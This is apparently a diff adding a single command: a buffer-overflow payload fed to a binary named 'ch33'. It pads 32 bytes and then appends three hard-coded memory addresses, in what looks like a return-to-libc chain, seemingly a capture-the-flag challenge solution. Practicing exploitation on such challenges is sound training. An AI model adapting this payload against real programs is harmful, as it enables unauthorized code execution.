@@ -1,0 +1,2 @@
+./ch33 $(python -c 'print "a" * 0x20 + "\x10\x83\xe6\xb7" + "\x60\xb2\xe5\xb7" + "\x4c\xad\xf8\xb7"')
+
